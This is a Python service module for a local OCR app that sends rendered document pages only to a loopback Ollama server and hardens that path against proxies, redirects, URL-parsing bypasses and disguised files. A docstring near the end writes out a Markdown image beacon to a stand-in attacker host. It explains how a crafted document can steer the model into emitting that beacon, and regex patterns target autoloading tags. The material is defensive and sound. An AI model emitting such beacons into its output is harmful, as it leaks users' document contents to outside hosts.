"""Service layer for Local OCR: validation, PDF rendering, Ollama, saving.

This module must stay free of Tk imports so every function can be tested
headlessly and no worker can accidentally touch the GUI.
"""

from __future__ import annotations

import io
import ipaddress
import os
import re
import subprocess
import sys
import tempfile
from contextlib import closing
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Iterable, Iterator
from urllib.parse import urlparse

import httpx  # the transport ollama uses; imported to validate hosts as it does
import ollama
import pymupdf

import config

LogCallback = Callable[[str], None]
ProgressCallback = Callable[[str, int, int], None]  # phase, current, total
EventCallback = Callable[[str, dict], None]  # (kind, payload)


class OCRServiceError(Exception):
    """A service operation (Ollama, PDF rendering, saving) failed."""


class OCRCancelled(Exception):
    """The user stopped the job. Deliberately NOT an OCRServiceError.

    Cancellation is a normal outcome, not a failure: it must not surface as
    an error dialog, and it must not be swallowed by the broad ``except
    Exception`` handlers that wrap genuine faults with diagnostic context.
    """


def _raise_if_cancelled(cancel_event) -> None:
    """Cooperative cancellation checkpoint.

    Threads cannot be interrupted safely in Python, so every long-running
    loop polls this instead. Checkpoints sit between pages and between
    stream chunks — the two places the worker reliably passes through — so a
    cancel takes effect within one chunk rather than at the end of the job.
    """
    if cancel_event is not None and cancel_event.is_set():
        raise OCRCancelled()


@dataclass(frozen=True)
class OCRRequest:
    """Immutable snapshot of everything an OCR worker needs."""

    input_path: Path
    output_path: Path
    ollama_url: str
    model: str
    dpi: int


def is_loopback_host(hostname: str | None) -> bool:
    """True only for hosts that cannot leave this machine.

    Accepts the literal name ``localhost`` (optionally fully qualified with a
    trailing dot) and any loopback IP literal — the whole 127.0.0.0/8 range,
    ``::1``, and IPv4-mapped forms such as ``::ffff:127.0.0.1``.

    Everything else is rejected, including names that merely *look* local
    (``localhost.example.com``, ``127.0.0.1.example.com``). Callers must pass
    ``urlparse(...).hostname`` rather than ``.netloc`` so that userinfo tricks
    like ``http://localhost@example.com/`` resolve to the real host.
    """
    if not hostname:
        return False
    host = hostname.strip().lower()
    # Strip at most ONE trailing dot — the root label of a fully qualified
    # name. Deliberately not rstrip("."), which would also fold invalid
    # forms like "localhost.." down to "localhost"; normalization here must
    # not be more permissive than the resolver's.
    if host.endswith("."):
        host = host[:-1]
    if host == "localhost":
        # RFC 6761 reserves "localhost" and requires it to resolve to
        # loopback; the name is never delegated in the root zone, so the
        # worst case for the qualified form is NXDOMAIN, not a remote host.
        return True
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        # Any other DNS name. We deliberately do not resolve it: a name that
        # points at loopback today can point elsewhere on the next lookup.
        return False
    mapped = getattr(address, "ipv4_mapped", None)
    if mapped is not None:
        address = mapped
    return address.is_loopback


def normalize_ollama_url(value: str) -> str:
    """Validate a user-entered Ollama base URL and return it normalized.

    Local OCR only ever talks to an Ollama server on this machine, so the
    host must be loopback. This is what makes the privacy claim enforceable
    rather than merely documented: no configuration can point the app at a
    server that would receive page images over the network.

    Keeps any path prefix so local reverse-proxy URLs work; never appends
    /api because the official client handles API paths itself.
    """
    url = value.strip().rstrip("/")
    if not url:
        raise ValueError("Ollama server URL is empty.")
    try:
        parsed = urlparse(url)
    except ValueError as exc:
        raise ValueError(
            f"Ollama server URL could not be parsed: {value.strip()!r} ({exc})."
        ) from exc
    if parsed.scheme not in ("http", "https"):
        raise ValueError(
            "Ollama server URL must start with http:// or https:// "
            f"(got: {value.strip()!r})."
        )
    if not parsed.netloc:
        raise ValueError(f"Ollama server URL has no host: {value.strip()!r}.")

    # Check the host as BOTH parsers see it. A URL only ever reaches the
    # network through httpx (via ollama), so httpx's opinion is the one that
    # decides where bytes actually go; urlparse is what a reader of this code
    # would reason about. Requiring them to agree removes the parser
    # -differential class of bypass entirely — a crafted URL that one parser
    # reads as loopback and the other as a remote host is rejected outright
    # rather than silently resolving in the client's favour.
    try:
        client_host = httpx.URL(url).host
    except Exception as exc:
        raise ValueError(
            f"Ollama server URL could not be parsed: {value.strip()!r} ({exc})."
        ) from exc

    for hostname in (parsed.hostname, client_host):
        if not is_loopback_host(hostname):
            raise ValueError(
                "Local OCR only connects to an Ollama server running on this "
                f"machine, and {hostname!r} is not a local address.\n\n"
                "Use http://localhost:11434, or another 127.0.0.1 / [::1] "
                "address if your Ollama listens on a different port."
            )
    return url


# Magic-byte signatures for the formats we accept. Checked before Pillow is
# handed anything, so a disguised file is rejected without its real decoder
# ever being selected — the extension allowlist alone cannot do this,
# because Pillow chooses a decoder by content and ignores the filename.
_IMAGE_SIGNATURES: tuple[tuple[bytes, str], ...] = (
    (b"\x89PNG\r\n\x1a\n", "PNG"),
    (b"\xff\xd8\xff", "JPEG"),
)


def sniff_image_format(data: bytes) -> str | None:
    """Identify an image by its leading bytes, or None if unrecognized.

    Deliberately knows only the handful of formats this app accepts. Anything
    else — PSD, GD, FITS, JPEG2000, TGA — is simply not identified, and the
    caller rejects it.
    """
    for signature, name in _IMAGE_SIGNATURES:
        if data.startswith(signature):
            return name
    # WebP is a RIFF container: "RIFF" <4-byte size> "WEBP".
    if len(data) >= 12 and data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        return "WEBP"
    return None


def verify_image_bytes(data: bytes, origin: str) -> str:
    """Confirm data really is an allowed image; return its format name.

    Two independent checks that must agree, the same belt-and-braces shape
    used for the Ollama URL:

    1. Our own magic-byte sniff, which runs before Pillow sees the data at
       all and so keeps a disguised file away from its decoder entirely.
    2. Pillow's own identification plus a pixel-count ceiling, which catches
       anything our sniff would wave through and stops a decompression bomb.

    Raising here rather than returning a flag keeps the failure loud: an
    input this app cannot vouch for is never sent to the model.
    """
    from PIL import Image

    sniffed = sniff_image_format(data)
    if sniffed is None or sniffed not in config.ALLOWED_IMAGE_FORMATS:
        allowed = ", ".join(sorted(config.ALLOWED_IMAGE_FORMATS))
        raise ValueError(
            f"{origin} is not a supported image. Its contents do not match "
            f"any of: {allowed}. (The file extension is not enough — the "
            f"file's actual format is what gets decoded.)"
        )
    try:
        with Image.open(io.BytesIO(data)) as img:
            decoded = img.format
            width, height = img.size
    except Exception as exc:
        raise ValueError(f"{origin} could not be read as an image: {exc}") from exc

    if decoded not in config.ALLOWED_IMAGE_FORMATS:
        raise ValueError(
            f"{origin} claims to be {sniffed} but decodes as {decoded}; "
            "refusing to process it."
        )
    if decoded != sniffed:
        raise ValueError(
            f"{origin} is ambiguous: it looks like {sniffed} but Pillow reads "
            f"it as {decoded}. Refusing to process it."
        )
    pixels = width * height
    if pixels > config.MAX_IMAGE_PIXELS:
        raise ValueError(
            f"{origin} is {width}x{height} ({pixels / 1_000_000:.0f} "
            f"megapixels), above the {config.MAX_IMAGE_PIXELS / 1_000_000:.0f} "
            "megapixel limit."
        )
    return decoded


def validate_input_path(path: Path) -> None:
    """Raise ValueError unless path is a readable, supported document."""
    if not path.exists():
        raise ValueError(f"File does not exist: {path}")
    if not path.is_file():
        raise ValueError(f"Not a regular file: {path}")
    if path.suffix.lower() not in config.SUPPORTED_EXTENSIONS:
        supported = ", ".join(sorted(config.SUPPORTED_EXTENSIONS))
        raise ValueError(
            f"Unsupported file type {path.suffix!r}. Supported: {supported}"
        )
    if not os.access(path, os.R_OK):
        raise ValueError(f"File is not readable: {path}")

    # Content check, not just the extension. Reading 12 bytes is instant even
    # for a huge file, so this can run on the UI thread and reject a
    # mislabelled file the moment it is picked rather than mid-job.
    if path.suffix.lower() in config.IMAGE_EXTENSIONS:
        try:
            with path.open("rb") as handle:
                header = handle.read(12)
        except OSError as exc:
            raise ValueError(f"File could not be read: {exc}") from exc
        sniffed = sniff_image_format(header)
        if sniffed is None or sniffed not in config.ALLOWED_IMAGE_FORMATS:
            raise ValueError(
                f"{path.name} has a {path.suffix} extension but its contents "
                "are not a PNG, JPEG or WebP image. Refusing to process it."
            )
    elif path.suffix.lower() in config.PDF_EXTENSIONS:
        try:
            with path.open("rb") as handle:
                header = handle.read(5)
        except OSError as exc:
            raise ValueError(f"File could not be read: {exc}") from exc
        if header != b"%PDF-":
            raise ValueError(
                f"{path.name} has a .pdf extension but does not start with a "
                "PDF header. Refusing to process it."
            )


def build_output_path(input_path: Path, output_dir: Path | None = None) -> Path:
    """Return the Markdown path for an input, optionally in a chosen folder.

    Defaults to beside the input — /dir/document_extracted.md for
    /dir/document.<ext> — which is convenient but means scanning a file that
    lives in Dropbox, OneDrive, iCloud Drive or a Syncthing folder puts the
    recognized text in that folder too, where the sync client uploads it.
    File permissions do not help: the sync client runs as the same user.
    Passing output_dir sends the result somewhere the user chose instead.
    """
    name = f"{input_path.stem}_extracted.md"
    if output_dir is None:
        return input_path.with_name(name)
    return output_dir / name


def validate_output_dir(path: Path) -> None:
    """Raise ValueError unless path is a directory we can write into."""
    if not path.exists():
        raise ValueError(f"Folder does not exist: {path}")
    if not path.is_dir():
        raise ValueError(f"Not a folder: {path}")
    if not os.access(path, os.W_OK | os.X_OK):
        raise ValueError(f"Folder is not writable: {path}")


def make_client(url: str, timeout: int) -> "ollama.Client":
    """Build an Ollama client whose traffic cannot leave this machine.

    Validating the URL as loopback is necessary but not sufficient — two
    httpx defaults would otherwise carry the page image off-box anyway, and
    both are disabled here:

    ``follow_redirects`` (defaults to True)
        Whatever is listening on the port could answer a 3xx pointing at an
        external host, and httpx would re-send the request — page image
        included — to that host. Verified: without this, a 307 from a local
        listener leaks the full base64 PNG to the redirect target. Ollama
        itself never redirects, so turning this off costs nothing.

    ``trust_env`` (defaults to True)
        This is the one that matters most, because it needs no attacker at
        all. With ``trust_env`` on, httpx routes through whatever proxy the
        environment names, and its proxy logic has *no loopback exemption*:
        with ``HTTP_PROXY`` set, even ``http://localhost:11434`` is sent to
        that proxy. Worse on the app's main platforms — httpx reads system
        proxy configuration via ``urllib.request.getproxies()``, which on
        macOS and Windows does not supply the OS's "bypass for localhost"
        list, so a system-wide proxy (corporate MITM, a debugging proxy, some
        VPN clients) would capture every page image with no env var set.

    Note that ``mounts={}`` does NOT substitute for ``trust_env=False``:
    httpx repopulates mounts from the environment.

    The URL is re-validated here rather than trusted from the caller so the
    loopback guarantee is a property of this function, not of every call
    site remembering to validate first.
    """
    normalize_ollama_url(url)
    return ollama.Client(
        host=url,
        timeout=timeout,
        follow_redirects=False,
        trust_env=False,
    )


def verify_ollama_endpoint(client: "ollama.Client") -> str:
    """Confirm something Ollama-shaped is listening before sending documents.

    The loopback lock guarantees page images stay on this machine. It says
    nothing about *which* program on this machine receives them: any local
    process that binds port 11434 first gets handed every page of every
    document, silently, because the app would simply stream to whatever
    answers.

    Probing ``/api/version`` does not authenticate anything — there is no
    secret to check, and a determined impersonator can return whatever this
    function looks for. What it does buy is that the common cases fail loudly
    instead of quietly: a wrong port, some other dev server on 11434, or a
    process that squats the port without bothering to imitate the API. That
    is worth one cheap request before the first page goes out.

    Returns the reported version string.
    """
    try:
        # The ollama client exposes no version endpoint, so this goes through
        # its underlying httpx client — which is the transport we want, since
        # it already carries the loopback base URL, redirects disabled and
        # trust_env disabled.
        response = client._client.get(
            "/api/version", timeout=config.ENDPOINT_VERIFY_TIMEOUT
        )
    except Exception as exc:
        raise OCRServiceError(
            f"No response from the Ollama server: {exc}\n\n"
            "Start Ollama (`ollama serve` or the desktop app) and check the "
            "port."
        ) from exc

    if response.status_code != 200:
        raise OCRServiceError(
            f"The server answered /api/version with HTTP "
            f"{response.status_code}, which is not what Ollama does. "
            "Something else may be listening on that port."
        )
    try:
        version = response.json().get("version")
    except Exception:
        version = None
    if not version or not isinstance(version, str):
        raise OCRServiceError(
            "The server on that port did not identify itself as Ollama. "
            "Refusing to send document pages to it."
        )
    return version


def list_models(url: str) -> list[str]:
    """Fetch model tags from an Ollama server, deduplicated and sorted."""
    try:
        client = make_client(url, config.MODEL_LIST_TIMEOUT)
        response = client.list()
        tags = {
            (getattr(item, "model", None) or "").strip()
            for item in response.models
        }
    except Exception as exc:
        raise OCRServiceError(f"Could not fetch models from {url}: {exc}") from exc
    tags.discard("")
    return sorted(tags, key=str.lower)


def _check_page_area(page, page_number: int, page_count: int, dpi: int) -> None:
    """Refuse to rasterize a page that would be absurdly large.

    PDF permits pages up to 200x200 inches. At 300 DPI that is 60000x60000 —
    3.6 billion pixels, ~10 GB of RGB — and the file describing it can be a
    few hundred bytes. MuPDF has its own ~1 GB ceiling and raises rather than
    dying, but by then the memory has already been reached for. Measuring
    page.rect first means the allocation is never attempted, and the message
    can suggest the fix (a lower DPI) instead of reporting an opaque failure.
    """
    rect = page.rect
    scale = dpi / 72.0  # PDF user units are 1/72 inch
    pixels = (rect.width * scale) * (rect.height * scale)
    if pixels > config.MAX_PAGE_PIXELS:
        inches_w = rect.width / 72.0
        inches_h = rect.height / 72.0
        suggested = max(
            (option for option in config.DPI_OPTIONS
             if (rect.width * option / 72.0) * (rect.height * option / 72.0)
             <= config.MAX_PAGE_PIXELS),
            default=None,
        )
        hint = (
            f" Try {suggested} DPI." if suggested
            else " This page is too large to rasterize at any offered DPI."
        )
        raise OCRServiceError(
            f"Page {page_number}/{page_count} is {inches_w:.0f}x{inches_h:.0f} "
            f"inches, which at {dpi} DPI would be "
            f"{pixels / 1_000_000:.0f} megapixels — above the "
            f"{config.MAX_PAGE_PIXELS / 1_000_000:.0f} megapixel limit.{hint}"
        )


@dataclass(frozen=True)
class PageImage:
    """One page of the input, held only in memory.

    ``data`` is the encoded image itself — PNG for a rendered PDF page, or
    the original file's bytes for an image input. It is never written to
    disk by this application.
    """

    number: int
    total: int
    data: bytes


def iter_pdf_pages(
    pdf_path: Path,
    dpi: int,
    log_callback: LogCallback,
    cancel_event=None,
) -> Iterator[PageImage]:
    """Yield each PDF page as PNG bytes, lazily, in original page order.

    Two deliberate properties, both privacy-motivated:

    *Never touches disk.* ``Pixmap.tobytes("png")`` produces the same bytes
    ``Pixmap.save()`` would have written, so nothing is gained by writing a
    file and something important is lost: a temp directory removed in a
    ``finally`` is not removed when the process dies on SIGKILL — a crash,
    a force-quit, an OOM kill, a flat battery — which left readable page
    images of the document in the system temp directory indefinitely (on
    macOS, under ``/var/folders``, which survives reboot). There is now no
    such directory to leak.

    *Lazy.* Pages are rendered one at a time as the consumer asks for them,
    rather than all up front. Peak memory is a single page regardless of
    document length, so a thousand-page PDF costs no more than a one-page
    one. Rendering everything up front would merely have moved the old
    unbounded-disk-growth problem into RAM.

    The caller must close this generator (iterate it to exhaustion, or wrap
    it in ``contextlib.closing``) so the underlying document is released.
    """
    try:
        document = pymupdf.open(pdf_path)
    except Exception as exc:
        raise OCRServiceError(f"Could not open PDF: {exc}") from exc
    with document:
        if document.needs_pass:
            raise OCRServiceError(
                "PDF is password-protected; encrypted documents are not supported."
            )
        page_count = document.page_count
        if page_count == 0:
            raise OCRServiceError("PDF contains no pages.")
        if page_count > config.MAX_PDF_PAGES:
            raise OCRServiceError(
                f"PDF has {page_count} pages, above the "
                f"{config.MAX_PDF_PAGES}-page limit. Split it into smaller "
                "documents and run them separately."
            )
        for index in range(page_count):
            _raise_if_cancelled(cancel_event)
            page_number = index + 1
            log_callback(f"Rendering page {page_number}/{page_count}...")
            try:
                page = document.load_page(index)
                _check_page_area(page, page_number, page_count, dpi)
                pixmap = page.get_pixmap(
                    dpi=dpi, colorspace=pymupdf.csRGB, alpha=False
                )
                png = pixmap.tobytes("png")
            except OCRServiceError:
                raise  # already precise; don't rewrap as a render failure
            except Exception as exc:
                raise OCRServiceError(
                    f"Failed to render page {page_number}/{page_count}: {exc}"
                ) from exc
            # Drop our reference before yielding so the pixmap (the large
            # object — a 300 DPI A4 page is ~26 MB raw) is collectable while
            # the consumer works on the much smaller encoded PNG.
            del pixmap
            yield PageImage(number=page_number, total=page_count, data=png)


def read_input_image(image_path: Path) -> Iterator[PageImage]:
    """Yield a single-page sequence for a non-PDF input.

    The file is the user's own and already on their disk, so reading it into
    memory creates no new residue; it just lets image and PDF inputs share
    one pipeline. Reading once also replaces two separate reads of the same
    file (one for the preview, one by the Ollama client).
    """
    try:
        data = image_path.read_bytes()
    except Exception as exc:
        raise OCRServiceError(f"Could not read image: {exc}") from exc
    if not data:
        raise OCRServiceError(f"Image file is empty: {image_path}")
    # Full verification now that the whole file is in hand: the header sniff
    # in validate_input_path is a fast pre-filter, this is the gate.
    try:
        verify_image_bytes(data, image_path.name)
    except ValueError as exc:
        raise OCRServiceError(str(exc)) from exc
    yield PageImage(number=1, total=1, data=data)


def make_thumbnail_png(source: bytes | Path, max_side: int) -> bytes:
    """Return a downscaled PNG, longest side <= max_side.

    Accepts encoded image bytes (the normal path — a rendered PDF page or an
    input image already in memory) or a filesystem path. Tk-free (PIL only)
    so it can be unit-tested headlessly. Accepts any format PIL can read.
    Smaller images are never upscaled.
    """
    from PIL import Image  # local import keeps module load light and headless

    origin = io.BytesIO(source) if isinstance(source, (bytes, bytearray)) else source
    with Image.open(origin) as img:
        thumbnail = img.convert("RGB")
        thumbnail.thumbnail((max_side, max_side))
        buffer = io.BytesIO()
        thumbnail.save(buffer, format="PNG")
        return buffer.getvalue()


def recognize_images(
    client: "ollama.Client",
    model: str,
    pages: Iterable[PageImage],
    log_callback: LogCallback,
    progress_callback: ProgressCallback | None = None,
    event_callback: EventCallback | None = None,
    cancel_event=None,
) -> list[str]:
    """Send one independent chat request per page; return texts in order.

    ``pages`` is consumed lazily, so for a PDF each page is rendered only
    when this function reaches it and is released immediately afterwards.

    Each page is requested with ``stream=True`` so that the recognized text
    appears in the UI as the model generates it.  Every chunk delta is
    surfaced via ``("stream_chunk", {"page": n, "text": delta})`` events;
    after the full page text is assembled and validated a final
    ``("page_text", {"page": n, "total": N, "text": text})`` event is
    emitted.  The non-streaming result is identical — streaming only adds
    the live deltas.
    """
    results: list[str] = []
    for page in pages:
        _raise_if_cancelled(cancel_event)
        number, total = page.number, page.total
        if progress_callback is not None:
            progress_callback("ocr", number, total)
        if event_callback is not None:
            # A failed preview must never abort OCR: log it and move on.
            try:
                png = make_thumbnail_png(page.data, config.THUMBNAIL_MAX_SIDE)
            except Exception as exc:
                log_callback(
                    f"Could not build preview for page {number}/{total}: {exc}"
                )
            else:
                event_callback(
                    "page_image",
                    {"page": number, "total": total, "png": png},
                )
        log_callback(f"Sending page {number}/{total} to Ollama...")
        chunks: list[str] = []
        try:
            stream = client.chat(
                model=model,
                messages=[
                    {"role": "system", "content": config.SYSTEM_PROMPT},
                    {
                        "role": "user",
                        "content": config.USER_PROMPT,
                        # ollama.Image is required: the client's schema
                        # rejects bare bytes. Serialises to exactly the same
                        # base64 a file path would have produced.
                        "images": [ollama.Image(value=page.data)],
                    },
                ],
                stream=True,
            )
            for chunk in stream:
                _raise_if_cancelled(cancel_event)
                delta = (getattr(getattr(chunk, "message", None), "content", None)
                         or "")
                if delta:
                    chunks.append(delta)
                    if event_callback is not None:
                        event_callback(
                            "stream_chunk",
                            {"page": number, "text": delta},
                        )
        except OCRCancelled:
            raise  # a stopped job is not a request failure
        except Exception as exc:
            raise OCRServiceError(
                f"Ollama request failed on page {number}/{total} "
                f"(model {model!r}): {exc}"
            ) from exc
        content = "".join(chunks).strip()
        if not content:
            raise OCRServiceError(
                f"Ollama returned no text for page {number}/{total} "
                f"(model {model!r})."
            )
        results.append(content)
        if event_callback is not None:
            event_callback(
                "page_text",
                {"page": number, "total": total, "text": content},
            )
    return results


# Markdown/HTML constructs that make a previewer fetch a remote resource on
# open. Anything that merely *displays* a URL as text is left alone.
# Note the `!+`: a single `!` would be wrong. Stripping one exclamation mark
# from `!![](http://…)` leaves `![](http://…)`, which is still a live image
# reference — the defusing has to consume the whole run.
_REMOTE_MD_IMAGE = re.compile(
    r"""!+(?=\[[^\]]*\]\(\s*(?:https?:)?//)""", re.IGNORECASE
)
_REF_MD_IMAGE = re.compile(r"""!+(?=\[[^\]]*\]\[)""")
_AUTOLOADING_TAG = re.compile(
    r"<(?=/?\s*(?:img|image|iframe|embed|object|video|audio|source|track|"
    r"script|link|style|base|input|portal|frame|frameset)\b)",
    re.IGNORECASE,
)


def neutralize_remote_media(content: str) -> tuple[str, int]:
    """Defuse anything in model output that would fetch a URL on preview.

    The recognized text is whatever the model produced from the page, and a
    crafted document can steer that. ``![](http://attacker/leak?…)`` in the
    saved Markdown turns "open the result" into a callback that confirms the
    document was processed and can carry a slice of it in the query string.
    The output file is also the one artifact of this app that gets opened by
    another program, so it is the natural place for that to pay off.

    The edit is deliberately the smallest one that works:

    * ``![alt](http://…)`` becomes ``[alt](http://…)`` — an ordinary link.
      The URL stays fully visible and clickable; it just no longer loads by
      itself. Reference-style ``![alt][id]`` is treated the same way.
    * ``<img …>``, ``<iframe>``, ``<script>`` and friends have their opening
      ``<`` escaped, so a previewer renders them as visible text instead of
      acting on them.

    Local and ``data:`` image references are untouched, and no other text is
    altered. Returns the cleaned content and the number of edits made, so the
    caller can tell the user something was changed.
    """
    cleaned, image_count = _REMOTE_MD_IMAGE.subn("", content)
    cleaned, ref_count = _REF_MD_IMAGE.subn("", cleaned)
    cleaned, tag_count = _AUTOLOADING_TAG.subn("&lt;", cleaned)
    return cleaned, image_count + ref_count + tag_count


def save_markdown_atomic(output_path: Path, content: str) -> None:
    """Write content as UTF-8 with \\n newlines, then publish atomically."""
    normalized = content.replace("\r\n", "\n").replace("\r", "\n")
    tmp_path: Path | None = None
    try:
        with tempfile.NamedTemporaryFile(
            "w",
            encoding="utf-8",
            newline="\n",
            delete=False,
            dir=output_path.parent,
            prefix=f".{output_path.stem}_",
            suffix=".tmp",
        ) as tmp_file:
            tmp_path = Path(tmp_file.name)
            tmp_file.write(normalized)
            tmp_file.flush()
        os.replace(tmp_path, output_path)
    except Exception as exc:
        if tmp_path is not None:
            try:
                tmp_path.unlink()
            except OSError:
                pass
        raise OCRServiceError(f"Could not save output file: {exc}") from exc


def open_in_default_app(path: Path) -> None:
    """Open a file with the OS default application. Tk-free.

    macOS uses ``open``, Windows ``os.startfile``, other platforms
    ``xdg-open``. Any failure is wrapped in OCRServiceError.
    """
    try:
        if sys.platform == "darwin":
            subprocess.run(["open", str(path)], check=True)
        elif sys.platform.startswith("win"):
            os.startfile(str(path))  # type: ignore[attr-defined]  # Windows only
        else:
            subprocess.run(["xdg-open", str(path)], check=True)
    except Exception as exc:
        raise OCRServiceError(f"Could not open {path}: {exc}") from exc


def reveal_in_file_manager(path: Path) -> None:
    """Reveal a file in the OS file manager (Finder/Explorer). Tk-free.

    macOS selects the file with ``open -R``; Windows with
    ``explorer /select,``; other platforms open the containing directory
    (no portable "select" flag exists). Any failure is wrapped.
    """
    try:
        if sys.platform == "darwin":
            subprocess.run(["open", "-R", str(path)], check=True)
        elif sys.platform.startswith("win"):
            # explorer returns exit code 1 even on success, so no check=True.
            subprocess.run(["explorer", f"/select,{path}"])
        else:
            subprocess.run(["xdg-open", str(path.parent)], check=True)
    except Exception as exc:
        raise OCRServiceError(f"Could not reveal {path}: {exc}") from exc


def process_ocr(request: OCRRequest, event_queue, cancel_event=None) -> Path:
    """Run the full OCR pipeline; emit ('log', message) events; return output.

    Raises on any failure, and ``OCRCancelled`` if ``cancel_event`` is set
    while the job runs — checked between pages and between stream chunks, so
    stopping takes effect promptly and no output file is written.

    No page image is ever written to disk: PDF pages are rendered to PNG
    bytes on demand and released as soon as they have been recognized. There
    is therefore no temporary directory to clean up, and nothing for a crash
    to leave behind. The only file this function writes is the requested
    Markdown output.

    The generator is closed through ``contextlib.closing`` on every path,
    including a mid-document failure, so the PDF handle is released promptly
    rather than at the whim of the garbage collector.
    """

    def log(message: str) -> None:
        event_queue.put(("log", message))

    def progress(phase: str, current: int, total: int) -> None:
        event_queue.put(("progress", {"phase": phase, "current": current, "total": total}))

    def emit_event(kind: str, payload: dict) -> None:
        event_queue.put((kind, payload))

    if request.input_path.suffix.lower() in config.PDF_EXTENSIONS:
        log("[1/3] Preparing document...")
        pages = iter_pdf_pages(
            request.input_path,
            request.dpi,
            lambda message: log(f"[1/3] {message}"),
            cancel_event,
        )
    else:
        log("[1/3] Preparing image...")
        pages = read_input_image(request.input_path)

    with closing(pages):
        try:
            client = make_client(
                request.ollama_url, config.OCR_STREAM_IDLE_TIMEOUT
            )
        except Exception as exc:
            raise OCRServiceError(
                f"Could not create Ollama client for {request.ollama_url}: {exc}"
            ) from exc

        # Confirm Ollama is what is actually listening before handing it a
        # single page. A local process squatting the port would otherwise
        # collect the whole document in silence.
        _raise_if_cancelled(cancel_event)
        version = verify_ollama_endpoint(client)
        log(f"[1/3] Ollama {version} responding at {request.ollama_url}")

        page_texts = recognize_images(
            client,
            request.model,
            pages,
            lambda message: log(f"[2/3] {message}"),
            progress,
            emit_event,
            cancel_event,
        )

    _raise_if_cancelled(cancel_event)
    log("[3/3] Saving Markdown...")
    content, neutralized = neutralize_remote_media("\n\n".join(page_texts))
    if neutralized:
        log(
            f"[3/3] Note: defused {neutralized} remote media reference(s) in "
            "the recognized text so opening the result cannot fetch them. "
            "The URLs are still readable in the file."
        )
    save_markdown_atomic(request.output_path, content)
    return request.output_path


# ---------------------------------------------------------------- batch


@dataclass(frozen=True)
class BatchOutcome:
    """What happened to every document in one batch run."""

    completed: list[Path]
    failures: list[tuple[Path, str]]

    @property
    def total(self) -> int:
        return len(self.completed) + len(self.failures)


def collect_inputs(paths: Iterable[Path], recursive: bool = False) -> list[Path]:
    """Expand a mix of files and folders into supported documents, sorted.

    Folders contribute the supported files they contain; anything whose
    extension is not supported is skipped silently, because a folder full of
    other things is the normal case rather than an error. Symlinked
    directories are not followed, so a loop in the tree cannot hang the scan.
    Duplicates are removed by resolved path, so dropping both a folder and a
    file inside it processes that file once.
    """
    seen: dict[Path, Path] = {}
    for entry in paths:
        if entry.is_dir():
            walker = entry.rglob("*") if recursive else entry.glob("*")
            for candidate in walker:
                if (candidate.is_file()
                        and candidate.suffix.lower() in config.SUPPORTED_EXTENSIONS):
                    seen.setdefault(candidate.resolve(), candidate)
        elif entry.is_file() and entry.suffix.lower() in config.SUPPORTED_EXTENSIONS:
            seen.setdefault(entry.resolve(), entry)
    return sorted(seen.values(), key=lambda p: str(p).lower())


def process_batch(
    requests: list[OCRRequest],
    event_queue,
    cancel_event=None,
) -> BatchOutcome:
    """Run several documents in one pass, reporting progress per file.

    One bad document does not end the batch. A corrupt PDF or an image that
    fails verification is recorded and the run moves to the next file —
    losing forty finished documents because the forty-first was malformed
    would be the wrong trade. Cancellation is the exception: it stops
    everything, because the user asked it to.

    Emits ``file_start`` / ``file_done`` / ``file_failed`` events alongside
    the per-page events ``process_ocr`` already produces, so the UI can show
    both "file 3 of 12" and "page 4 of 9" at once.
    """
    completed: list[Path] = []
    failures: list[tuple[Path, str]] = []
    total = len(requests)

    for index, request in enumerate(requests, start=1):
        _raise_if_cancelled(cancel_event)
        event_queue.put((
            "file_start",
            {"index": index, "total": total, "name": request.input_path.name},
        ))
        try:
            saved = process_ocr(request, event_queue, cancel_event)
        except OCRCancelled:
            raise
        except Exception as exc:
            failures.append((request.input_path, str(exc)))
            event_queue.put((
                "file_failed",
                {
                    "index": index,
                    "total": total,
                    "name": request.input_path.name,
                    "error": str(exc),
                },
            ))
        else:
            completed.append(saved)
            event_queue.put((
                "file_done",
                {
                    "index": index,
                    "total": total,
                    "name": request.input_path.name,
                    "output": str(saved),
                },
            ))

    return BatchOutcome(completed=completed, failures=failures)
